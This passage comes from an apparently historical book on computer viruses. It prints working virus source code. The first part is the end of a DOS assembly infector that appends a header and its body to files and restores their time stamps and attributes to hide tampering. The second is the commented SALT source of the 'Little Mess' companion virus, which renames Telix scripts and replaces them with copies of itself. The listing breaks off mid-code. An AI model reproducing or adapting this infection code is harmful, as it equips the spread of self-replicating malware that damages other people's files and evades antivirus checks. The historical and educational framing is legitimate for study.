&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4301h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; clear file attributes</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filename<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; openreadwrite<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5700h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get file time/date</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save them on stack</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; write filesize to the old</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; SYS header</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filesize<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4202h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; go to end of file</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cwd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; xor dx, dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; concatenate header</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> offset endheader <span style="color: #339933;">-</span> offset header<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>bigbuffer<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; concatenate virus</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> offset heap <span style="color: #339933;">-</span> offset endheader<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>endheader<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5701h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore file time/date</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3eh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; close file</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4301h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore file attributes</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; bombout<br />
<br />
openreadwrite<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; open read/write mode</span><br />
open<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3dh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filename<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; put handle in bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
heap<span style="color: #339933;">:</span><br />
savebx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
savees &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
buffer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">2</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br />
filename&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">13</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br />
filesize&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
bigbuffer &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; offset endheader <span style="color: #339933;">-</span> offset header dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br />
<br />
endheap<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; header<br />
&nbsp;</div>
<h3><a name="pj5"></a>Little Mess</h3>
<p>Script files for communication packages and word processors are, in effect, executable files, and so may be infected just like normal DOS executables.</p>
<p>Even Word Basic<sup><a href="#f77" name="b77">77</a></sup>, contains potentially dangerous commands which can be used to write Word Macro viruses.
<!--p.202-->
Examples are <em>Declare Function</em> and <em>IsAppLoaded Lib</em>. These commands are able to execute any routine found in the Windows Dynamic Link Library (.DLL) files. These link files are called on by Windows to perform specific such operations as the disk I/O functions, video function, etc.</p>
<p>A Word Basic macro can be written which uses these functions to infect and alter other Word macros. Of course, the potential for spreading one of these viruses is almost nil until someone finds a way to make Word documents ubiquitous.</p>
<!--p.203-->
<p>An example of a script virus is the Little Mess. This
is a companion virus which infects Telix SALT<sup><a href="#f78" name="b78">78</a></sup> script
<!--p.204-->
files. More information can be found written in the virus comments.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">// Little Mess spawning virus source (c) 92 Crom-Cruach/Trident</span><br />
<span style="color: black; font-style: italic;">// Source in SALT</span><br />
<span style="color: black; font-style: italic;">//</span><br />
<span style="color: black; font-style: italic;">// The compiled script needs some little changes:</span><br />
<span style="color: black; font-style: italic;">// *First, both 1234h's in the SLC must be replaced by (FileLen-011h)</span><br />
<span style="color: black; font-style: italic;">// *the 1st 11h bytes of the script must be copied over the 'REPLACE</span><br />
<span style="color: black; font-style: italic;">// ME!'; *Both 1D 06 00's sequences MUST be replaced by 1D 02 00...</span><br />
<br />
<span style="color: black; font-style: italic;">// This is of course only educational, and even if it wasn't, it still</span><br />
<span style="color: black; font-style: italic;">// wouldn't spread due to the script exchange rate.</span><br />
<span style="color: black; font-style: italic;">//</span><br />
<span style="color: black; font-style: italic;">// Bad minds, however, might think it's fun having their local network-</span><br />
<span style="color: black; font-style: italic;">// sysop screaming about his system being infected while all anti-</span><br />
<span style="color: black; font-style: italic;">// viral/integrity programs miss it (or, him being dissed for saying</span><br />
<span style="color: black; font-style: italic;">// he's got a script-virus)... Of course, those people are wrong and/or</span><br />
<span style="color: black; font-style: italic;">// sick.</span><br />
<br />
<span style="color: black; font-style: italic;">// Symptoms - 1 out of 8 times it displays a message for 1 sec after</span><br />
<span style="color: black; font-style: italic;">// script execution if all scripts infected.</span><br />
<br />
<span style="color: black; font-style: italic;">// Greetz - NuKE / Phalcon/SKISM / YAM &amp; All other practicing</span><br />
<span style="color: black; font-style: italic;">// researchers...</span><br />
<br />
<span style="color: black; font-style: italic;">// Technical info ---</span><br />
<span style="color: black; font-style: italic;">//</span><br />
<span style="color: black; font-style: italic;">// First, the uninfected file is renamed to *.SLX.</span><br />
<span style="color: black; font-style: italic;">// Then, the SLC file is created and the copy of the header is written</span><br />
<span style="color: black; font-style: italic;">// to it. After that, the whole virus is written as a string to the</span><br />
<span style="color: black; font-style: italic;">// file (SALT-string identification code is 19h; offsets in SLC are</span><br />
<span style="color: black; font-style: italic;">// calculated relative to the end of the header (= on +0Ch) - The 06 -&gt;</span><br />
<span style="color: black; font-style: italic;">// 02 patch changes the offset of the</span><br />
<span style="color: black; font-style: italic;">// buffer to write from Title (+6) to [EndHeader+1] (+2)... The 1234-</span><br />
<span style="color: black; font-style: italic;">// patch is needed to fill in the size of that string). After that, some</span><br />
<span style="color: black; font-style: italic;">// random bytes are written to make the files less suspicious (the</span><br />
<span style="color: black; font-style: italic;">// amount must be even; at least, CS (the TELIX script compiler) never</span><br />
<span style="color: black; font-style: italic;">// creates files with odd lengths)</span><br />
<span style="color: black; font-style: italic;">// I wanted to mark the SLX files as hidden; but in SALT you can only -</span><br />
<span style="color: black; font-style: italic;">// read the attribute of a file. Solution could be to write a little</span><br />
<span style="color: black; font-style: italic;">// routine in ASM to a temporary file &amp; to RUN that file; I decided not</span><br />
<span style="color: black; font-style: italic;">// to, because the flash from the shell-to-dos is much more obvious than</span><br />
<span style="color: black; font-style: italic;">// some 'SLX'-files.</span><br />
<span style="color: black; font-style: italic;">// A system can be infected by starting this script from Telix. It will</span><br />
<span style="color: black; font-style: italic;">// infect one script at a time.</span><br />
<br />
<span style="color: #993333;">int</span> EndHeader <span style="color: #339933;">=</span> <span style="color: #208080;">0x123419</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Needed for code-copy</span><br />
<br />
str Title<span style="color: black;">&#91;</span><span style="color: #0000dd;">40</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;[Little Mess (c) 92 Crom-Cruach/Trident]&quot;</span><span style="color: #339933;">;</span><br />
str Org_Ext<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;.SLX&quot;</span><span style="color: #339933;">;</span><br />
<br />
str Path<span style="color: black;">&#91;</span><span style="color: #0000dd;">64</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>Trash<span style="color: black;">&#91;</span><span style="color: #0000dd;">64</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br />
str Buf<span style="color: black;">&#91;</span><span style="color: #0000dd;">12</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// No script to start after 'mother'.</span><br />
str Spawned_On<span style="color: black;">&#91;</span><span style="color: #0000dd;">12</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br />
<br />
<span style="color: black; font-style: italic;">// Header</span><br />
str Header<span style="color: black;">&#91;</span><span style="color: #0000dd;">17</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #ff0000;">&quot;REPLACE ME!&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// must be replaced by header (debug)</span><br />
<span style="color: #993333;">int</span> Handle<span style="color: #339933;">;</span><br />
main<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; Spawned_On <span style="color: #339933;">=</span> Buf<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; path <span style="color: #339933;">=</span> _script_dir<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>path<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;*.SLC&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Search script (not 8 chars-FName!)</span><br />
FNext<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>not FileFind<span style="color: black;">&#40;</span>path<span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: #339933;">,</span>Buf<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// File found?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> EndHeader<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// No more; mark 'all infected'</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; path <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;&quot;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Prepare for find-next</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; trash <span style="color: #339933;">=</span> _script_dir<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>trash<span style="color: #339933;">,</span>Buf<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Trash = path+filename+ext</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FNStrip<span style="color: black;">&#40;</span>Trash<span style="color: #339933;">,</span><span style="color: #0000dd;">7</span><span style="color: #339933;">,</span>Buf<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Buf = filename only</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>Buf<span style="color: #339933;">,</span>Org_Ext<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Give new extension</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>frename<span style="color: black;">&#40;</span>Trash<span style="color: #339933;">,</span>Buf<span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> FNext<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// File not renamed (already spawned)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Handle <span style="color: #339933;">=</span> FOpen<span style="color: black;">&#40;</span>Trash<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;w&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Make new file, same name</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If <span style="color: black;">&#40;</span>Handle <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Error opening; restore orig. fname</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Path <span style="color: #339933;">=</span> _script_dir<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcat.html"><span style="color: #000066;">strcat</span></a><span style="color: black;">&#40;</span>path<span style="color: #339933;">,</span>Buf<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// path = path+new_fname</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; frename<span style="color: black;">&#40;</span>Path<span style="color: #339933;">,</span>Trash<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">// rename-back</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> Quit_Infect<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FWrite<span style="color: black;">&#40;</span>Header<span style="color: #339933;">,</span><span style="color: #0000dd;">17</span><span style="color: #339933;">,</span>Handle<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Write header</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FWrite<span style="color: black;">&#40;</span>Title<span style="color: #339933;">,</span><span style="color: #208080;">0x1234</span><span style="color: #339933;">,</span>Handle<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">// Title REPLACED by (ofs EndH.+1)</span><br />
